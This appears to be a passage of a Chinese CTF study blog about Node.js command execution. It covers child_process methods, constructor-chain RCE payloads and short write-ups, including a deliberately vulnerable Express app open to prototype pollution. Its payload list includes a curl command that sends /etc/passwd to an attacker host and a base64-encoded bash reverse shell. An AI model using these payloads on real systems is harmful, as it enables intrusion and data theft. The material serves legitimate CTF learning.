用npm安装后再<code>require()</code></li></ol></li></ol><h3 id="Express中间件"><a href="#Express中间件" class="headerlink" title="Express中间件"></a>Express中间件</h3><h3 id="Nodejs执行系统命令"><a href="#Nodejs执行系统命令" class="headerlink" title="Nodejs执行系统命令"></a>Nodejs执行系统命令</h3><h4 id="Inject-Point-载体≈代码执行"><a href="#Inject-Point-载体≈代码执行" class="headerlink" title="Inject Point(载体≈代码执行)"></a>Inject Point(载体≈代码执行)</h4><ol><li><code>eval(&#39;console.log(&quot;hello world&quot;)&#39;)</code>，类似php eval</li><li>各种类型的回调函数，与时间相关 -&gt; 在漏洞中体现为可控输入(注意原型链)<ol><li><code>Function(&quot;console.log(&#39;HelloWolrd&#39;)&quot;)()</code>类似php的create_function</li><li><code>setTimeout(some_function, 2000)</code></li><li><code>setInteval(some_function, 2000)</code></li></ol></li></ol><h4 id="child-process-内置-module"><a href="#child-process-内置-module" class="headerlink" title="child_process 内置 module"></a>child_process 内置 module</h4><ol><li><p>child_process模块提供了以类似于popen(3)的方式生成子进程的能力，但不完全相同</p></li><li><p>命令<code>console.log(require(&#39;child_process&#39;))</code>返回一下内容 -&gt; 返回的是一个带有很多方法的对象，可以用于执行命令</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">_forkChild</span>: [<span class="title class_">Function</span>: _forkChild],</span><br><span class="line">  <span class="title class_">ChildProcess</span>: [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],</span><br><span class="line">  <span class="attr">exec</span>: [<span class="title class_">Function</span>: exec],</span><br><span class="line">  <span class="attr">execFile</span>: [<span class="title class_">Function</span>: execFile],</span><br><span class="line">  <span class="attr">execFileSync</span>: [<span class="title class_">Function</span>: execFileSync],</span><br><span class="line">  <span class="attr">execSync</span>: [<span class="title class_">Function</span>: execSync],</span><br><span class="line">  <span class="attr">fork</span>: [<span class="title class_">Function</span>: fork],</span><br><span class="line">  <span class="attr">spawn</span>: [<span class="title class_">Function</span>: spawn],</span><br><span class="line">  <span class="attr">spawnSync</span>: [<span class="title class_">Function</span>: spawnSync]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h5 id="1-child-process-exec-command-options-callback-和child-process-execSync-command-options"><a href="#1-child-process-exec-command-options-callback-和child-process-execSync-command-options" class="headerlink" title="1. child_process.exec(command[, options][, callback])和child_process.execSync(command[, options])"></a>1. <code>child_process.exec(command[, options][, callback])</code>和<code>child_process.execSync(command[, options])</code></h5><ol><li><p><code>child_process.exec(command[, options][, callback])</code></p><ol><li><p><strong>不使用callback无法直接获取输出</strong>: 会立即打印出ChildProcess对象，但不会等待命令执行完毕。因此，你看到的是子进程启动时的状态，而不是命令执行的结果 –&gt; <strong>不过命令是会执行的</strong>，需要回显时考虑<code>require(&#39;child_process&#39;).exec(&#39;ls&#39;,(error,stdout,stderr)=&gt;&#123;console.log(stdout)&#125;)</code></p><ol><li>exec函数返回一个ChildProcess对象。这个对象代表了新创建的子进程，并提供了与该子进程交互的方法和属性</li></ol></li><li><p>一些常用的payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;</span>);  <span class="comment">// curl传输文件，可以考虑重定向文件发出信息ls</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol></li><li><p><code>child_process.execSync(command[, options])</code></p><ol><li><strong>同步阻塞非异步</strong>: exec() 和 execSync() 函数可用于执行命令并返回其输出。exec() 是异步的，这意味着它在命令完成之前就返回，而 execSync() 是同步的，这意味着它在命令完成之前阻塞<ol><li>可以利用这个情况获取输出比如<code>ls</code>命令这些</li></ol></li><li>常见payload和1.中的一样</li></ol></li></ol><h5 id="2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options"><a href="#2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options" class="headerlink" title="2. child_process.spawn(command[, args][, options])和child_process.spawnSync(command[, args][, options])"></a>2. <code>child_process.spawn(command[, args][, options])</code>和<code>child_process.spawnSync(command[, args][, options])</code></h5><ol><li><code>child_process.spawn(command[, args][, options])</code><ol><li><p><strong>child_process基础函数</strong>: child_process模块中所有函数都是基于spawn和spawnSync函数的来实现的，换句话来说，spawn和spawnSync函数的配置是最完全的，其它函数都是对其做了封装和修改</p></li><li><p><strong>实现子进程与父进程的通信</strong>: child_process.spawn()方法使用给定的command生成一个新进程，并在args中使用命令行参数 -&gt; 命令行参数不用放到command里了</p><ol><li>如果中间数据过多也会阻塞，详见api文档</li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;spawn&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> spawnObj = <span class="title function_">spawn</span>(<span class="string">&#x27;ping&#x27;</span>, [<span class="string">&#x27;127.0.0.1&#x27;</span>], &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;);</span><br><span class="line">spawnObj.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="keyword">function</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;close code : &#x27;</span> + code);</span><br><span class="line">&#125;)</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exit code : &#x27;</span> + code);</span><br><span class="line">    fs.<span class="title function_">close</span>(fd, <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>option中有一个shell</p><ol><li>如果启用了shell选项，请勿将未经处理的用户输入传递给此函数。任何包含 shell 元字符的输入都可用于触发任意命令执行</li><li><code>shell &lt;boolean&gt; | &lt;string&gt;</code>如果为true ，则在 shell 内运行command 。在 Unix 上使用’&#x2F;bin&#x2F;sh’ ，在 Windows 上使用process.env.ComSpec 。可以将不同的 shell 指定为字符串。请参阅Shell 要求和默认 Windows shell(在api文档中)。默认值： false （无 shell）</li></ol></li></ol></li><li><code>child_process.spawnSync(command[, args][, options])</code><ol><li>和<code>child_process.execSync()</code>更相似一点</li><li>区别<ol><li>execSync: 可以解析 shell 特性（如管道、重定向等），一次执行复杂命令</li><li>spawnSync:  直接执行指定的可执行文件，不通过 shell。因此，它不能解析 shell 特性，安全性更好 –&gt; <strong>指定shell字符时可以(chat一下就好)</strong></li></ol></li></ol></li></ol><h5 id="3-child-process-execFile-Sync-file-args-options-callback"><a href="#3-child-process-execFile-Sync-file-args-options-callback" class="headerlink" title="3. child_process.execFile[Sync](file[, args][, options][, callback])"></a>3. <code>child_process.execFile[Sync](file[, args][, options][, callback])</code></h5><ol><li><code>child_process.execFile[Sync](file[, args][, options][, callback])</code><ol><li>执行一个可执行文件，可以通过shell参数来执行命令<ol><li>默认不通过shell，这意味着你不能利用 shell 的功能，比如 I&#x2F;O 重定向和管道 –&gt; <code>execFile(&#39;/bin/ls&#39;, [&#39;-la&#39;])</code> 会直接调用 <code>/bin/ls</code> 并传递 <code>-la</code> 参数</li></ol></li><li><strong>要求</strong><ol><li><p>被执行的文件一定要有可执行权限，如果是类似.py类的特定语言的脚本，一定在开头指定解释器程序路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; execFile &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定 Python 解释器的路径和脚本路径</span></span><br><span class="line"><span class="keyword">const</span> pythonPath = <span class="string">&#x27;/usr/bin/python3&#x27;</span>; <span class="comment">// 或者你系统中 Python 的实际路径</span></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./script.py&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> args = [<span class="string">&#x27;arg1&#x27;</span>, <span class="string">&#x27;arg2&#x27;</span>];</span><br><span class="line"><span class="title function_">execFile</span>(pythonPath, [scriptPath, ...args], <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`执行出错: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h5 id="4-child-process-fork-modulePath-args-options"><a href="#4-child-process-fork-modulePath-args-options" class="headerlink" title="4. child_process.fork(modulePath[, args][, options])"></a>4. <code>child_process.fork(modulePath[, args][, options])</code></h5><ol><li><code>fork()</code> 函数可用于创建一个新的 Node.js 进程，该进程与父进程共享相同的内存空间。这意味着<strong>父进程和子进程可以相互通信并访问彼此的变量和函数</strong><ol><li>与child_process.spawn()类似，返回一个ChildProcess对象。返回的ChildProcess将有一个额外的内置通信通道，允许消息在父进程和子进程之间来回传递 –&gt; 详见api文档</li><li>派生的Node.js子进程独立于父进程，但两者之间建立的IPC通信通道除外。每个进程都有自己的内存和V8实例。由于需要额外的资源分配，不建议生成大量的子Node.js进程</li></ol></li><li><strong>无法执行任意命令</strong>: child_process.fork()不支持child_process.spawn()中可用的shell选项，如果设置该选项，则将被忽略</li></ol><h5 id="补充的外部module"><a href="#补充的外部module" class="headerlink" title="补充的外部module"></a>补充的外部module</h5><ol><li>shelljs module from npm</li><li>simple-git</li></ol><h2 id="RCE-Tricks"><a href="#RCE-Tricks" class="headerlink" title="*RCE Tricks"></a>*RCE Tricks</h2><h3 id="原型链constructor构造载体"><a href="#原型链constructor构造载体" class="headerlink" title="原型链constructor构造载体"></a>原型链constructor构造载体</h3><h4 id="IIFE和Function"><a href="#IIFE和Function" class="headerlink" title="IIFE和Function"></a>IIFE和Function</h4><ol><li>在js中所有函数对象都是通过Function构造函数创建的 –&gt; 函数对象的<code>func.__proto__.constructor==Function</code>(通过原型链直接<code>func.constructor也是</code>)</li><li><strong>利用思路</strong>: 使用Function()来实现任意函数，并且通过抬手可得的原始类型(与包装对象有自动转换机制，<strong>自动装箱和拆箱</strong>)获取Function，这里以<code>Number</code>为例子<ol><li>Number.prototype 是所有 Number 实例的原型</li><li>Number 本身是一个函数，它的原型是 <code>Function.prototype</code></li><li>通过<code>(1).constructor.constructor</code>访问到<code>Function</code>对象</li></ol></li><li><em><strong><code>Function</code>对象</strong></em><ol><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function">mdn Function</a></li><li><code>Function([arg1, arg2, ..., argN], functionBody)</code>可以构造<code>Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b;&#39;);</code></li></ol></li><li>*<strong>立即调用函数表达式IIFE</strong><ol><li><p>作用: 创建一个独立的作用域，以避免变量污染全局命名空间。IIFE 可以有效地封装变量和函数，使其对外部不可见</p></li><li><p>js两种调用形式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="constructor-payload"><a href="#constructor-payload" class="headerlink" title="constructor payload"></a>constructor payload</h4><ol><li>CJS版本<ol><li><code>(1).constructor.constructor(&quot;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();&quot;)();</code></li><li><code>(1).constructor.constructor(&#39;return require(&quot;child_process&quot;).execSync(`\x64\x69\x72`).toString();&#39;)();</code> –&gt; 当exec中为十六进制时，要把单引号’改成反引号&#96;这里是js模板字符串</li></ol></li><li>ES6版本<ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97">mdn 动态加载模块</a></li><li><code>(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(cp=&gt;&#123;cp.exec(&#39;cat /flag&#39;);&#125;);&quot;)();</code></li></ol></li><li>实际操作可以写一个探测脚本，现在没必要</li></ol><h3 id="PP2RCE"><a href="#PP2RCE" class="headerlink" title="PP2RCE"></a>PP2RCE</h3><ol><li>详见recurrence: SycServer2_SCTF24</li></ol><h3 id="global-process-mainModule-constructor-load"><a href="#global-process-mainModule-constructor-load" class="headerlink" title="global.process.mainModule.constructor._load"></a>global.process.mainModule.constructor._load</h3><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>nodejs基础<ol><li><a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">菜鸟教程</a></li><li><a href="https://liaoxuefeng.com/books/javascript/nodejs/">廖雪峰</a></li><li>可以看看，感觉不错，其中具体模块可以看看api文档这些<a href="https://juejin.cn/post/7218117377053098039">系列专栏</a></li><li>其他核心概念：模块、事件驱动架构、异步 I&#x2F;O、流、缓冲区、全局对象、Node.js 运行时、节点包管理器 (npm)、事件循环、中间件和错误处理</li></ol></li><li>具体执行命令<ol><li>官方<a href="https://nodejs.org/api/child_process.html">api文档</a></li><li>看看学过人怎么讲<a href="https://segmentfault.com/a/1190000045261949#item-3-2">child_process</a></li><li><a href="https://blog.csdn.net/cindy647/article/details/108830841">外置模块</a></li><li>可以多查查绕过</li></ol></li><li>nodejs漏洞利用<ol><li><a href="https://hackerqwq.github.io/2021/04/20/nodejs%E5%88%A9%E7%94%A8%E5%B0%8F%E6%80%BB%E7%BB%93/#eval%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">个人博客，很不错的一篇，点很多</a></li><li><a href="https://wiki.scuctf.com/ctfwiki/web/1.nodejs/nodejs/">川大ctf wiki</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> all in one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_nodejs</title>
      <link href="/2024/10/30/ctfshow_nodejs/"/>
      <url>/2024/10/30/ctfshow_nodejs/</url>
      
        <content type="html"><![CDATA[<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><ol><li><a href="https://blog.csdn.net/miuzzx/article/details/111780832">csdn挺好，比较全面</a></li><li><a href="https://blog.csdn.net/qq_53263789/article/details/121351854">csdn 还有其他资源</a></li><li><a href="https://hextuff.dev/2022/06/09/ctfshow-web-getting-started-nodejs/#web334">一个和我主题一样的个人博客</a></li></ol><h2 id="web334-看懂nodejs"><a href="#web334-看懂nodejs" class="headerlink" title="web334: 看懂nodejs"></a>web334: 看懂nodejs</h2><ol><li>直接审计代码，无需绕过，看懂即可秒了</li><li>payload: <code>username=ctfshow&amp;password=123456</code></li></ol><h2 id="web335-rce"><a href="#web335-rce" class="headerlink" title="web335: rce"></a>web335: rce</h2><ol><li>提示找不到文件，冥冥中感觉像是文件包含&#x2F;代码执行？注入1直接回显，执行命令有flag，payload<code>require(&quot;child_process&quot;).execSync(&#39;ls&#39;)</code></li><li>官方<code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</code></li></ol><h2 id="web-336"><a href="#web-336" class="headerlink" title="web 336:"></a>web 336:</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ez_Express_CYCTF20</title>
      <link href="/2024/10/30/Ez_Express_CYCTF20/"/>
      <url>/2024/10/30/Ez_Express_CYCTF20/</url>
      
        <content type="html"><![CDATA[<blockquote><p>复现平台: buuoj</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol><li>抓包看源码，发现<a href="http://www.zip,阅读发现关键文件index.js/">www.zip，阅读发现关键文件index.js</a><ol><li>用户数据存储在req.session.user中</li><li>流程<ol><li>导航到&#x2F;未登录重定向到&#x2F;login页面，通过res来进行渲染</li><li>结合1要登录admin用户会检查req.session.user的信息是否匹配，又无法获取admin的密码 -&gt; 但是有一个可能，<strong>覆盖</strong>？通过注册实现，但是有安全检查，等下再绕过，看看搞不搞得通<ol><li>思路1<ol><li>登录admin后传<strong>body污染原型链</strong>，原型链只能在登录后进行污染</li><li>获取信息，带外(需要命令执行)&#x2F;回显(难，没法读文件)，这里肯定要读文件，可不可以进行命令执行 -&gt; 通过原型链污染后新建的对象都会有某个属性，将某个属性设置为一个函数，<strong>执行命令</strong>，理论可行，可以执行命令直接看反弹shell，不出网就用回显处理(类似wangding24 web02)</li></ol></li><li>思路1待解决<ol><li>覆盖需要绕过，match()绕过，处理match还对username**进行了什么处理(从处理想对策)**，可能有用？toUpperCase()？<ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">toUpperCase</a>，可以进行绕过，这里node漏洞的</li></ol></li><li>命令执行部分使用shell.js可以一试，需要找到一个对象访问它的属性但是被覆盖 -&gt; 先访问&#x2F;action在访问&#x2F;info有res.outputFunctionName(在&#x2F;目录中的和&#x2F;action中的不一样)，通过<code>&#123;&quot;__proto__&quot;: &#123;&quot;outputFunctionName&quot;: function() &#123;命令执行实现&#125;&#125;</code><ol><li><a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">nodejs</a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="index-js"><a href="#index-js" class="headerlink" title="index.js"></a>index.js</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><h2 id="修正"><a href="#修正" class="headerlink" 